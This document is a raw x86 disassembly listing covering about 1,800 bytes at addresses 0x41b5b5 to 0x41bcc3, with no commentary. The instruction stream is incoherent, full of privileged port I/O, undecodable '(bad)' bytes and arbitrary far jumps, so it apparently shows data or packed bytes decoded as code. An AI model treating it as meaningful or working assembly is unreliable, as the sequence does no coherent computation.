  41b5b5:	xchg   ecx,eax
  41b5b6:	data16 fs std 
  41b5b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5ba:	ffree  st(6)
  41b5bc:	les    edx,FWORD PTR [edi+edi*8+0x46]
  41b5c0:	out    dx,al
  41b5c1:	fisubr DWORD PTR [ecx]
  41b5c3:	mov    dh,BYTE PTR [eax+0x62]
  41b5c6:	pop    ebx
  41b5c7:	pop    edi
  41b5c8:	mov    ecx,0xcc499d56
  41b5cd:	jmp    0x41b624
  41b5cf:	add    ebp,DWORD PTR [ecx-0xe6e20f0]
  41b5d5:	inc    ecx
  41b5d6:	fsubrp st(4),st
  41b5d8:	lods   eax,DWORD PTR ds:[esi]
  41b5d9:	out    dx,al
  41b5da:	push   0x3bed3f63
  41b5df:	aaa    
  41b5e0:	sbb    BYTE PTR cs:[ecx-0x72f94c62],dl
  41b5e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5e8:	adc    eax,0x40024edd
  41b5ed:	jns    0x41b61c
  41b5ef:	pop    ss
  41b5f0:	push   edx
  41b5f1:	outs   dx,BYTE PTR ds:[esi]
  41b5f2:	fprem1 
  41b5f4:	rol    DWORD PTR [eax],cl
  41b5f6:	jg     0x41b613
  41b5f8:	add    BYTE PTR [edi],dl
  41b5fa:	sub    eax,DWORD PTR [edx+0x3c]
  41b5fd:	or     eax,0xdfa4eb3
  41b602:	enter  0x735c,0xe7
  41b606:	sti    
  41b607:	sbb    eax,0x1290e4f1
  41b60c:	xchg   BYTE PTR [ebx+0x6935f00c],bh
  41b612:	pop    edx
  41b613:	div    BYTE PTR [ecx+0x562dd9a9]
  41b619:	pushf  
  41b61a:	mov    dh,0x8d
  41b61c:	ins    BYTE PTR es:[edi],dx
  41b61d:	inc    eax
  41b61e:	jb     0x41b69f
  41b620:	mov    ecx,0x616462c0
  41b625:	popf   
  41b626:	and    al,BYTE PTR gs:[ecx+0x51]
  41b62a:	xchg   DWORD PTR [eax+ebx*2],esp
  41b62d:	xor    eax,0x4b63cf07
  41b632:	sub    eax,0xeb212ba6
  41b637:	mov    ebx,0x2b29fff7
  41b63c:	int    0x6a
  41b63e:	retf   0x9ea0
  41b641:	mul    BYTE PTR [edx]
  41b643:	xor    DWORD PTR [eax-0x7d],ebp
  41b646:	xchg   DWORD PTR [ebx-0x69],eax
  41b649:	repz or DWORD PTR [ebp-0x57cb957d],edi
  41b650:	mov    BYTE PTR [eax+0x2b],al
  41b653:	out    0xa8,al
  41b655:	int    0xca
  41b657:	loopne 0x41b6ac
  41b659:	pop    ebx
  41b65a:	nop
  41b65b:	cwde   
  41b65c:	inc    eax
  41b65d:	out    0xf,al
  41b65f:	lods   eax,DWORD PTR ds:[esi]
  41b660:	add    ah,BYTE PTR ds:0x95e7ca51
  41b666:	aad    0xe6
  41b668:	dec    edx
  41b669:	jmp    0x41b628
  41b66b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b66c:	loop   0x41b6a2
  41b66e:	pop    ebx
  41b66f:	push   es
  41b670:	or     eax,0x808b1b2
  41b675:	popa   
  41b676:	sub    bh,dl
  41b678:	mov    ebp,0xcd3dfdbc
  41b67d:	(bad)  
  41b67e:	sbb    DWORD PTR [edx+0x1ff7f79d],edi
  41b684:	and    eax,0x52d4f36d
  41b689:	in     eax,dx
  41b68a:	xchg   esp,eax
  41b68b:	xchg   ecx,eax
  41b68c:	das    
  41b68d:	fiadd  WORD PTR [edx-0x38]
  41b690:	ret    
  41b691:	shl    DWORD PTR ds:0xa624a5d2,0xd9
  41b698:	fild   QWORD PTR [edx]
  41b69a:	(bad)  
  41b69b:	imul   edx,edi,0xdfeece90
  41b6a1:	mov    ebp,DWORD PTR [esi+eax*4+0x79]
  41b6a5:	not    DWORD PTR [ecx-0x63]
  41b6a8:	sar    BYTE PTR [eax+eax*4-0x20],0x55
  41b6ad:	stos   DWORD PTR es:[edi],eax
  41b6ae:	test   DWORD PTR [esi],0x28ff4b6f
  41b6b4:	or     ecx,DWORD PTR [ebx+edi*8-0x46]
  41b6b8:	nop
  41b6b9:	or     DWORD PTR [ecx-0x4f87ba07],esi
  41b6bf:	xor    eax,0x89cb5bab
  41b6c4:	lea    ebp,[eax+0x65]
  41b6c7:	mov    dl,0xc7
  41b6c9:	pop    ss
  41b6ca:	fist   WORD PTR [esi]
  41b6cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6cd:	sbb    dh,BYTE PTR [edi]
  41b6cf:	push   esp
  41b6d0:	jl     0x41b717
  41b6d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6d3:	push   edx
  41b6d4:	arpl   sp,bx
  41b6d6:	je     0x41b68a
  41b6d8:	inc    esi
  41b6d9:	jnp    0x41b6cc
  41b6db:	dec    ebp
  41b6dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6dd:	iret   
  41b6de:	adc    al,0xf5
  41b6e0:	adc    edx,DWORD PTR [ebx+0x28]
  41b6e3:	push   ds
  41b6e4:	mov    edi,?
  41b6e6:	(bad)  
  41b6e7:	push   ds
  41b6e8:	stos   BYTE PTR es:[edi],al
  41b6e9:	xor    al,0x99
  41b6eb:	pushf  
  41b6ec:	rcr    BYTE PTR [edi-0x39e6502a],0x96
  41b6f3:	repz cmp ebx,DWORD PTR [ebx]
  41b6f6:	mov    bh,0x3d
  41b6f8:	jbe    0x41b74f
  41b6fa:	jne    0x41b6ff
  41b6fc:	or     ebx,DWORD PTR [bx-0x74]
  41b700:	fsubr  QWORD PTR [ecx-0x3c]
  41b703:	aaa    
  41b704:	dec    esi
  41b705:	cmp    eax,0xea1f3dde
  41b70a:	sub    ebx,DWORD PTR [ebp+0x7dbe9822]
  41b710:	in     eax,0x4b
  41b712:	pop    edi
  41b713:	xor    eax,0x52e4ff10
  41b718:	ins    BYTE PTR es:[edi],dx
  41b719:	add    eax,0xb8bc80d8
  41b71e:	adc    DWORD PTR [eax*1-0x44c51735],0xffffffb7
  41b726:	xchg   ebp,eax
  41b727:	or     dl,0xe7
  41b72a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b72b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b72c:	mov    esi,0x9898bfa3
  41b731:	stos   BYTE PTR es:[edi],al
  41b732:	shl    DWORD PTR [ecx],0x9c
  41b735:	cmovp  edx,DWORD PTR [esi-0x73220c55]
  41b73c:	jecxz  0x41b794
  41b73e:	fsubr  QWORD PTR [ebx]
  41b740:	out    dx,al
  41b741:	loope  0x41b6d6
  41b743:	inc    ebp
  41b744:	fist   WORD PTR [ebx-0x69ff8045]
  41b74a:	aas    
  41b74b:	pop    ss
  41b74c:	dec    ecx
  41b74d:	cdq    
  41b74e:	out    dx,al
  41b74f:	mov    ebx,0xd51973ad
  41b754:	mov    edi,0xe67a8492
  41b759:	div    DWORD PTR [esi]
  41b75b:	mov    ah,0xd1
  41b75d:	inc    ebx
  41b75e:	and    BYTE PTR [esi],bl
  41b760:	clc    
  41b761:	mov    bh,0x3f
  41b763:	push   esp
  41b764:	inc    edx
  41b765:	test   eax,0xf2998510
  41b76a:	in     al,dx
  41b76b:	pop    edi
  41b76c:	adc    eax,0x6721e9fa
  41b771:	adc    dl,bl
  41b773:	mov    esi,0x5b7b0d64
  41b778:	(bad)  
  41b779:	cmp    BYTE PTR [eax+0xae457cb],bh
  41b77f:	loop   0x41b746
  41b781:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b782:	sar    BYTE PTR [ebx+0x24223957],1
  41b788:	pop    ss
  41b789:	push   ebp
  41b78a:	add    DWORD PTR [ecx-0x312e2f80],eax
  41b790:	loope  0x41b753
  41b792:	sbb    cl,BYTE PTR [edx+esi*2-0x2998992]
  41b799:	arpl   WORD PTR [ecx],ax
  41b79b:	cmc    
  41b79c:	mov    dl,0xa
  41b79e:	or     eax,0xd9cfbd12
  41b7a3:	jg     0x41b78c
  41b7a5:	mov    cl,0x50
  41b7a7:	das    
  41b7a8:	stos   DWORD PTR es:[edi],eax
  41b7a9:	sub    dh,BYTE PTR [edx]
  41b7ab:	inc    ebx
  41b7ac:	out    0x23,al
  41b7ae:	inc    esp
  41b7af:	sahf   
  41b7b0:	inc    ebp
  41b7b1:	add    al,0xec
  41b7b3:	pop    esi
  41b7b4:	inc    BYTE PTR [esp+ebx*8-0x4cab81d6]
  41b7bb:	lea    ecx,[edx]
  41b7bd:	repnz add al,0xcb
  41b7c0:	in     eax,dx
  41b7c1:	xchg   ecx,eax
  41b7c2:	pop    ds
  41b7c3:	jnp    0x41b840
  41b7c5:	getsec 
  41b7c7:	mov    dl,0x2e
  41b7c9:	arpl   WORD PTR [ebx],cx
  41b7cb:	cmp    BYTE PTR [esi-0x3e],dl
  41b7ce:	jmp    0x9c8:0xa69478fb
  41b7d5:	rol    al,0xc9
  41b7d8:	mov    ds:0x6319918a,eax
  41b7dd:	jmp    0x17de:0x9a0a1605
  41b7e4:	xchg   ebx,eax
  41b7e5:	jmp    0x88fd21aa
  41b7ea:	popf   
  41b7eb:	xor    bl,dh
  41b7ed:	push   eax
  41b7ee:	jg     0x41b7d1
  41b7f0:	jns    0x41b7a4
  41b7f2:	mov    al,0xac
  41b7f4:	jl     0x41b848
  41b7f6:	test   al,bh
  41b7f8:	add    cl,ah
  41b7fa:	jo     0x41b7d6
  41b7fc:	cmp    ch,dl
  41b7fe:	cmp    dh,BYTE PTR [eax+0x49]
  41b801:	sub    ebp,edx
  41b803:	jo     0x41b86e
  41b805:	sti    
  41b806:	js     0x41b856
  41b808:	inc    eax
  41b809:	gs add al,0x5d
  41b80c:	nop
  41b80d:	hlt    
  41b80e:	bound  edi,QWORD PTR [ecx+edi*8+0x37]
  41b812:	pop    esp
  41b813:	nop
  41b814:	fwait
  41b815:	push   esi
  41b816:	jge    0x41b7c9
  41b818:	or     al,ch
  41b81a:	mov    ds:0x8fcef3a,al
  41b81f:	jg     0x41b7ab
  41b821:	pop    ebp
  41b822:	sar    BYTE PTR [eax+0xb8b6438],0xa
  41b829:	sbb    edi,DWORD PTR [eax-0x11]
  41b82c:	enter  0xff99,0x9
  41b830:	popf   
  41b831:	loopne 0x41b854
  41b833:	fs add al,0x79
  41b836:	pop    es
  41b837:	xor    DWORD PTR [ecx*1+0x276859e],ebx
  41b83e:	adc    BYTE PTR [edi+eax*2],dh
  41b841:	mov    ah,0x53
  41b843:	push   ecx
  41b844:	inc    ebp
  41b845:	or     DWORD PTR [ebx],ebx
  41b847:	in     al,0x28
  41b849:	pop    ebp
  41b84a:	retf   
  41b84b:	pop    edi
  41b84c:	aaa    
  41b84d:	cmp    al,0xef
  41b84f:	cmp    eax,DWORD PTR [edi-0x58]
  41b852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b853:	getsec 
  41b855:	pusha  
  41b856:	push   0xc27d43e0
  41b85b:	pop    ebp
  41b85c:	jae    0x41b825
  41b85e:	pop    es
  41b85f:	outs   dx,BYTE PTR ds:[esi]
  41b860:	gs cdq 
  41b862:	adc    edi,ebx
  41b864:	and    al,0xf8
  41b866:	push   edi
  41b867:	sub    eax,0x27a70bd4
  41b86c:	pop    ss
  41b86d:	fld    QWORD PTR [ebx]
  41b86f:	aaa    
  41b870:	fstp   QWORD PTR [eax-0x72682d8a]
  41b876:	add    al,0x9
  41b878:	into   
  41b879:	cmp    eax,0x96ffad08
  41b87e:	mov    ebp,0x755b44d
  41b883:	mov    ebx,0x6ac4fdce
  41b888:	or     DWORD PTR [ebx+0x5e21964f],esi
  41b88e:	pop    ss
  41b88f:	fdivrp st(2),st
  41b891:	cmp    esp,DWORD PTR [ecx+0xf]
  41b894:	and    eax,0x8f965eb1
  41b899:	inc    edx
  41b89a:	in     eax,0x46
  41b89c:	mov    ch,0x68
  41b89e:	int    0xa2
  41b8a0:	cld    
  41b8a1:	dec    edx
  41b8a2:	adc    eax,DWORD PTR [ecx+0x43c67c58]
  41b8a8:	push   ds
  41b8a9:	xchg   ebp,eax
  41b8aa:	mov    ds:0xba2d3439,al
  41b8af:	mov    ?,WORD PTR [edx-0xb]
  41b8b2:	pop    ss
  41b8b3:	and    edi,DWORD PTR [ebp+0x3b]
  41b8b6:	push   edi
  41b8b7:	idiv   DWORD PTR [ecx+0x1]
  41b8ba:	das    
  41b8bb:	mov    ch,0x23
  41b8bd:	sub    ebx,DWORD PTR [ebx]
  41b8bf:	add    ah,0xca
  41b8c2:	fdivr  QWORD PTR [edi+0x38d4ab9d]
  41b8c8:	or     DWORD PTR [edi-0x3bded65],esp
  41b8ce:	pop    esi
  41b8cf:	stos   DWORD PTR es:[edi],eax
  41b8d0:	pushf  
  41b8d1:	or     ebx,DWORD PTR ds:0x9814105c
  41b8d7:	xor    eax,0x7580f798
  41b8dc:	adc    BYTE PTR [eax+0x20371b05],cl
  41b8e2:	pop    es
  41b8e3:	inc    esi
  41b8e4:	or     dl,ah
  41b8e6:	stos   DWORD PTR es:[edi],eax
  41b8e7:	enter  0x1d6f,0xe3
  41b8eb:	inc    ebx
  41b8ec:	xchg   DWORD PTR [ebx-0x1a],ebx
  41b8ef:	cli    
  41b8f0:	pop    ds
  41b8f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8f2:	xor    dl,BYTE PTR [ecx]
  41b8f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8f5:	pop    edi
  41b8f6:	outs   dx,BYTE PTR ds:[esi]
  41b8f7:	sti    
  41b8f8:	std    
  41b8f9:	inc    edx
  41b8fa:	jae    0x41b887
  41b8fc:	clc    
  41b8fd:	adc    eax,0xf4c9eaa6
  41b902:	dec    esi
  41b903:	jge    0x41b940
  41b905:	mov    bl,0xdb
  41b907:	dec    ecx
  41b908:	mov    al,0x1
  41b90a:	jns    0x41b90e
  41b90c:	push   edi
  41b90d:	and    al,0x57
  41b90f:	push   0x344a10e8
  41b914:	js     0x41b987
  41b916:	xchg   DWORD PTR [ebx-0x7e],edx
  41b919:	fwait
  41b91a:	in     al,0xfe
  41b91c:	or     esi,DWORD PTR [edi]
  41b91e:	(bad)  
  41b91f:	sub    eax,DWORD PTR [edx-0x6fb2135]
  41b925:	mov    ch,0x5a
  41b927:	and    BYTE PTR [esi-0x61cf1e1e],bl
  41b92d:	out    0x89,al
  41b92f:	std    
  41b930:	test   BYTE PTR [edx+0x2b4cce18],dl
  41b936:	mov    esp,0x9a01e665
  41b93b:	sbb    cl,BYTE PTR [ebx]
  41b93d:	push   es
  41b93e:	mov    ecx,0xea82ca5f
  41b943:	cmp    ecx,DWORD PTR [eax-0x12a4b8cf]
  41b949:	pop    ss
  41b94a:	lods   eax,DWORD PTR ds:[esi]
  41b94b:	add    al,cl
  41b94d:	scas   al,BYTE PTR es:[edi]
  41b94e:	and    al,0x86
  41b950:	addr16 daa 
  41b952:	mov    ebx,0x9e037f86
  41b957:	sub    al,0x4f
  41b959:	mov    eax,0xbd5f1f73
  41b95e:	sbb    ecx,edx
  41b960:	jns    0x41b92d
  41b962:	cmp    DWORD PTR [ebx-0xd],0x11
  41b966:	add    eax,0xd4c008a9
  41b96b:	lods   al,BYTE PTR ds:[esi]
  41b96c:	push   ebp
  41b96d:	xchg   esi,eax
  41b96e:	test   al,0x42
  41b970:	and    DWORD PTR [eax],eax
  41b972:	jge    0x41b986
  41b974:	mov    BYTE PTR [ecx+0x74fa7a0b],dh
  41b97a:	xchg   ebx,eax
  41b97b:	int    0xb6
  41b97d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b97e:	(bad)  
  41b97f:	outs   dx,DWORD PTR ds:[esi]
  41b980:	cmp    eax,0x44baa70b
  41b985:	inc    edi
  41b986:	(bad)  
  41b987:	stos   BYTE PTR es:[edi],al
  41b988:	and    ah,ah
  41b98a:	jp     0x41b9b8
  41b98c:	out    0xdf,al
  41b98e:	push   0x2345b1a1
  41b993:	xchg   edx,eax
  41b994:	jg     0x41b947
  41b996:	dec    edx
  41b997:	mov    ah,bl
  41b999:	out    dx,eax
  41b99a:	mov    ebx,DWORD PTR [edx+0x738f0c85]
  41b9a0:	shl    BYTE PTR [ebx],1
  41b9a2:	stos   DWORD PTR es:[edi],eax
  41b9a3:	fs leave 
  41b9a5:	xchg   ecx,eax
  41b9a6:	and    cl,BYTE PTR [edx-0x79d6032]
  41b9ac:	jno    0x41b9e2
  41b9ae:	cmp    bh,BYTE PTR [esi+0x10986221]
  41b9b4:	dec    ecx
  41b9b5:	sti    
  41b9b6:	adc    al,0x5c
  41b9b8:	leave  
  41b9b9:	aas    
  41b9ba:	pop    edx
  41b9bb:	aam    0xdd
  41b9bd:	pop    ss
  41b9be:	pushf  
  41b9bf:	jge    0x41b944
  41b9c1:	dec    esp
  41b9c2:	cmp    BYTE PTR [eax],bh
  41b9c4:	ins    BYTE PTR es:[edi],dx
  41b9c5:	stos   DWORD PTR es:[edi],eax
  41b9c6:	jle    0x41ba23
  41b9c8:	ins    DWORD PTR es:[edi],dx
  41b9c9:	cdq    
  41b9ca:	mov    fs,WORD PTR [edx-0x5a]
  41b9cd:	(bad)  
  41b9ce:	cmp    BYTE PTR [esi+0x16],bl
  41b9d1:	lock jmp 0xdf576f45
  41b9d7:	sbb    esp,DWORD PTR [ebx]
  41b9d9:	js     0x41b9ca
  41b9db:	in     al,0xa0
  41b9dd:	sub    al,0xa3
  41b9df:	scas   eax,DWORD PTR es:[edi]
  41b9e0:	(bad)  
  41b9e1:	lds    edi,FWORD PTR [edi+0x62]
  41b9e4:	neg    BYTE PTR [edx-0x62]
  41b9e7:	cmp    edx,DWORD PTR [esi-0x3afeeb93]
  41b9ed:	js     0x41ba34
  41b9ef:	adc    dh,ch
  41b9f1:	not    BYTE PTR [ebx-0x3bbaa95f]
  41b9f7:	and    ebp,DWORD PTR [edi+0x246d4361]
  41b9fd:	lods   eax,DWORD PTR ds:[esi]
  41b9fe:	mov    ch,0x65
  41ba00:	rcr    DWORD PTR [edi+0x3e35bb9c],cl
  41ba06:	mov    dh,0x1c
  41ba08:	sbb    esi,DWORD PTR [eax+ebp*4]
  41ba0b:	jl     0x41b9c1
  41ba0d:	popf   
  41ba0e:	xchg   ecx,eax
  41ba0f:	out    0xa6,eax
  41ba11:	mov    al,0xb1
  41ba13:	mov    ah,BYTE PTR gs:[esi+0x70]
  41ba17:	push   ss
  41ba18:	shr    BYTE PTR [ecx+0x51],cl
  41ba1b:	aad    0x8c
  41ba1d:	cmp    eax,0x42d2f8fb
  41ba22:	shl    BYTE PTR [esi-0x46],1
  41ba25:	(bad)  
  41ba26:	ins    BYTE PTR es:[edi],dx
  41ba27:	sbb    DWORD PTR [esi],edx
  41ba29:	mov    bh,0xe8
  41ba2b:	adc    ebp,ecx
  41ba2d:	xor    esp,DWORD PTR [edi]
  41ba2f:	gs jl  0x41ba77
  41ba32:	int    0x58
  41ba34:	mov    DWORD PTR [edx],ebp
  41ba36:	sbb    DWORD PTR [edx-0x15db70b5],ecx
  41ba3c:	xchg   ecx,eax
  41ba3d:	dec    edx
  41ba3e:	data16 or al,0x11
  41ba41:	sub    esi,ebx
  41ba43:	adc    ecx,ebx
  41ba45:	xchg   BYTE PTR [ecx],ch
  41ba47:	mov    dh,0xb9
  41ba49:	cmp    ebp,eax
  41ba4b:	mov    eax,0x612d0a0a
  41ba50:	repz lea esi,[esi-0x57]
  41ba54:	xor    esp,DWORD PTR [ecx+edx*1-0x32e1fdb2]
  41ba5b:	call   0x16e4:0xcfd3ae7
  41ba62:	push   ebp
  41ba63:	pop    eax
  41ba64:	adc    eax,0xe0e4719c
  41ba69:	xchg   ebp,eax
  41ba6a:	es inc ebp
  41ba6c:	xchg   esi,ecx
  41ba6e:	adc    eax,0x65136d26
  41ba73:	adc    esp,DWORD PTR [esi+ebp*1+0x43]
  41ba77:	sub    ebx,esp
  41ba79:	inc    ebp
  41ba7a:	jmp    0xdffe22
  41ba7f:	fs icebp 
  41ba81:	or     dl,BYTE PTR [ebx+ecx*2+0x7b027237]
  41ba88:	inc    esp
  41ba89:	test   al,0xe5
  41ba8c:	das    
  41ba8d:	cmc    
  41ba8e:	dec    edi
  41ba8f:	shl    ebx,cl
  41ba91:	cmp    bl,BYTE PTR [ebp-0x5f46162b]
  41ba97:	jecxz  0x41bab1
  41ba99:	sub    DWORD PTR [esi-0x7b],eax
  41ba9c:	pop    edi
  41ba9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba9e:	sbb    DWORD PTR [edx],edx
  41baa0:	mov    edi,0x8b4df5d4
  41baa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baa6:	push   ecx
  41baa7:	rcl    DWORD PTR [esi+eiz*8+0x72],1
  41baab:	repz pop edx
  41baad:	pop    ebx
  41baae:	call   0x8017:0x4181d28f
  41bab5:	pop    eax
  41bab6:	xor    al,BYTE PTR [ecx]
  41bab8:	or     edx,DWORD PTR [eax+0x1e3105bb]
  41babe:	call   0x34d4bb23
  41bac3:	ja     0x41baa9
  41bac5:	(bad)  
  41bac6:	and    al,0xc
  41bac8:	ins    DWORD PTR es:[edi],dx
  41bac9:	inc    ecx
  41baca:	nop
  41bacb:	mov    al,0x30
  41bacd:	fst    DWORD PTR [esi]
  41bacf:	xor    BYTE PTR [edx-0x3b],ah
  41bad2:	cdq    
  41bad3:	add    DWORD PTR [esi-0x10],ebx
  41bad6:	call   0xeb32d53
  41badb:	fisttp QWORD PTR ds:0x971df1ba
  41bae1:	adc    al,0x14
  41bae3:	jmp    0x41bada
  41bae5:	(bad)  
  41bae6:	xchg   edx,eax
  41bae7:	jl     0x41bae5
  41bae9:	pop    eax
  41baea:	in     al,0x67
  41baec:	ja     0x41bb2d
  41baee:	cmc    
  41baef:	dec    ecx
  41baf0:	shr    edi,0xc0
  41baf3:	cdq    
  41baf4:	scas   eax,DWORD PTR es:[edi]
  41baf5:	jge    0x41bad6
  41baf7:	dec    esp
  41baf8:	jp     0x41bb33
  41bafa:	dec    esp
  41bafb:	push   0xe6d584
  41bb00:	xchg   esp,eax
  41bb01:	dec    eax
  41bb02:	xor    ebx,DWORD PTR [edx]
  41bb04:	aad    0x7f
  41bb06:	stos   BYTE PTR es:[edi],al
  41bb07:	int    0x75
  41bb09:	dec    edx
  41bb0a:	dec    ebx
  41bb0b:	fnstcw WORD PTR [edi-0x13]
  41bb0e:	jno    0x41bb87
  41bb10:	shr    DWORD PTR [eax],0x70
  41bb13:	xchg   esp,eax
  41bb14:	jns    0x41bb7e
  41bb16:	dec    edx
  41bb17:	outs   dx,BYTE PTR ds:[esi]
  41bb18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb19:	or     esp,DWORD PTR [esi-0x1e]
  41bb1c:	cmp    al,0x81
  41bb1e:	and    BYTE PTR [ecx+0x6ac0c154],cl
  41bb24:	dec    ebx
  41bb25:	push   ebp
  41bb26:	mov    dh,0x92
  41bb28:	sub    edx,DWORD PTR [ecx+0x47]
  41bb2b:	sahf   
  41bb2c:	ret    0x5937
  41bb2f:	popa   
  41bb30:	fld    TBYTE PTR [ecx]
  41bb32:	push   ecx
  41bb33:	sub    al,0x62
  41bb35:	inc    edx
  41bb36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb37:	div    ah
  41bb39:	mov    ds:0x91be25b1,eax
  41bb3e:	aad    0xac
  41bb40:	nop
  41bb41:	jmp    0xc805c316
  41bb46:	std    
  41bb47:	sahf   
  41bb48:	out    0x15,eax
  41bb4a:	cs dec edi
  41bb4c:	hlt    
  41bb4d:	sub    DWORD PTR [ebx+eax*8],ecx
  41bb50:	adc    eax,0x1eacc607
  41bb55:	and    ah,BYTE PTR [ecx]
  41bb57:	pop    ebp
  41bb58:	das    
  41bb59:	std    
  41bb5a:	in     al,dx
  41bb5b:	aas    
  41bb5c:	jno    0x41bb8b
  41bb5e:	sub    BYTE PTR [eax+ecx*1-0x52c99189],dl
  41bb65:	jne    0x41bb34
  41bb67:	sub    al,0x74
  41bb69:	ret    0x1498
  41bb6c:	imul   edx,edi,0xb6c8605e
  41bb72:	mov    ?,WORD PTR [eax-0x30]
  41bb75:	out    dx,eax
  41bb76:	mov    ds:0xb9117c45,eax
  41bb7b:	stos   BYTE PTR es:[edi],al
  41bb7c:	inc    edi
  41bb7d:	arpl   WORD PTR [ecx-0x1],si
  41bb80:	hlt    
  41bb81:	imul   BYTE PTR [esi+edi*1+0x35726f34]
  41bb88:	pop    ebx
  41bb89:	mov    al,ds:0x4941f0e
  41bb8e:	sbb    BYTE PTR [esi],bh
  41bb90:	xchg   esp,eax
  41bb91:	sub    ecx,DWORD PTR [edx+0x3aa0cd5c]
  41bb97:	adc    BYTE PTR [ebp-0xd],al
  41bb9a:	ja     0x41bb6c
  41bb9c:	(bad)  
  41bb9d:	jmp    0x933c:0xc4b52222
  41bba4:	inc    eax
  41bba5:	call   DWORD PTR [eax+ecx*8+0x6f]
  41bba9:	stos   DWORD PTR es:[edi],eax
  41bbaa:	inc    edi
  41bbab:	xchg   ebp,eax
  41bbac:	dec    edi
  41bbad:	(bad)  
  41bbae:	xchg   ebx,eax
  41bbaf:	in     al,0x27
  41bbb1:	sahf   
  41bbb2:	call   0x2c06:0x8cb3c0d6
  41bbb9:	mov    BYTE PTR [edx+0x48247cb5],cl
  41bbbf:	dec    ecx
  41bbc0:	shl    BYTE PTR [edi+0x29efc42a],cl
  41bbc6:	sub    edi,ecx
  41bbc8:	dec    ebx
  41bbc9:	iret   
  41bbca:	and    DWORD PTR [esi],0xffffffb4
  41bbcd:	inc    ecx
  41bbce:	shl    ah,0x1d
  41bbd1:	pop    esp
  41bbd2:	xor    al,0xd6
  41bbd4:	push   cs
  41bbd5:	adc    DWORD PTR [edx],0x7a
  41bbd8:	mov    al,ds:0xd23dfabd
  41bbdd:	(bad)  
  41bbde:	shr    ebx,1
  41bbe0:	in     al,0x4c
  41bbe2:	adc    dh,BYTE PTR [edi-0x23c24e6c]
  41bbe8:	sbb    DWORD PTR [edi],esi
  41bbea:	or     edx,esi
  41bbec:	cdq    
  41bbed:	dec    ecx
  41bbee:	dec    edx
  41bbef:	fmul   st,st(1)
  41bbf1:	mov    fs,ebp
  41bbf3:	jns    0x41bbf3
  41bbf5:	mov    bh,0x86
  41bbf7:	or     dh,dh
  41bbf9:	xchg   ecx,eax
  41bbfa:	enter  0xd591,0xd9
  41bbfe:	popa   
  41bbff:	fwait
  41bc00:	sbb    bh,ch
  41bc02:	ds (bad) 
  41bc05:	out    dx,eax
  41bc06:	enter  0x57be,0x6a
  41bc0a:	ins    DWORD PTR es:[edi],dx
  41bc0b:	xor    al,0x9f
  41bc0d:	loope  0x41bc7e
  41bc0f:	dec    ecx
  41bc10:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41bc12:	stos   BYTE PTR es:[edi],al
  41bc13:	jb     0x41bc2c
  41bc15:	lds    ebp,FWORD PTR ds:0xce928515
  41bc1b:	xchg   esi,eax
  41bc1c:	sbb    BYTE PTR [edx+0x2dc975c9],bh
  41bc22:	adc    BYTE PTR [ecx],0x4
  41bc25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc26:	pop    es
  41bc27:	xchg   BYTE PTR fs:[eax],ch
  41bc2a:	mov    ebp,0x6392282c
  41bc2f:	stos   DWORD PTR es:[edi],eax
  41bc30:	call   0x36af6472
  41bc35:	clc    
  41bc36:	add    BYTE PTR [esi-0x7],0xa1
  41bc3a:	int3   
  41bc3b:	std    
  41bc3c:	or     esp,DWORD PTR [eax+edx*4+0xeb92558]
  41bc43:	push   0x2daff72d
  41bc48:	adc    eax,0x71087ffc
  41bc4d:	adc    eax,0x368fdc1
  41bc52:	mov    ebx,0x25e56406
  41bc57:	ins    DWORD PTR es:[edi],dx
  41bc58:	mov    ch,0x10
  41bc5a:	push   0xffffff84
  41bc5c:	(bad)  
  41bc5d:	out    0x2b,al
  41bc5f:	xor    BYTE PTR [edi-0x38],dl
  41bc62:	(bad)  [esi+0x58]
  41bc65:	(bad)  
  41bc66:	fwait
  41bc67:	inc    ecx
  41bc68:	adc    DWORD PTR ds:0xe6fc45ff,ebx
  41bc6e:	jp     0x41bc00
  41bc70:	push   esp
  41bc71:	scas   al,BYTE PTR es:[edi]
  41bc72:	cmc    
  41bc73:	and    BYTE PTR [esi],ah
  41bc75:	adc    DWORD PTR [ecx-0x8],0xffffffdb
  41bc79:	mov    DWORD PTR [edx+0x30],0x24cd30ec
  41bc80:	enter  0x2672,0x36
  41bc84:	test   DWORD PTR cs:[edx+eax*4-0x35],eax
  41bc89:	mov    al,ds:0x9176e519
  41bc8e:	out    dx,al
  41bc8f:	push   ss
  41bc90:	div    BYTE PTR [eax]
  41bc92:	sbb    al,ch
  41bc94:	push   0xfffffff7
  41bc96:	and    al,0x2d
  41bc98:	xchg   edi,eax
  41bc99:	dec    ebx
  41bc9a:	jno    0x41bc9b
  41bc9c:	mov    ah,0xc0
  41bc9e:	xor    al,0x24
  41bca0:	out    dx,al
  41bca1:	sub    BYTE PTR [esi+eiz*4],ah
  41bca4:	mov    esp,ebx
  41bca6:	mov    cl,BYTE PTR [ebx+esi*4]
  41bca9:	and    edx,DWORD PTR [edi]
  41bcab:	or     BYTE PTR [ecx-0x4b],0x52
  41bcaf:	push   esp
  41bcb0:	cmp    eax,0x4f20059a
  41bcb5:	push   ebx
  41bcb6:	out    0xe2,eax
  41bcb8:	fisub  WORD PTR [ecx+0x42]
  41bcbb:	sub    DWORD PTR [ecx+0x721a3f4b],edx
  41bcc1:	ror    DWORD PTR [ebx],cl
  41bcc3:	xlat   BYTE PTR ds:[ebx]
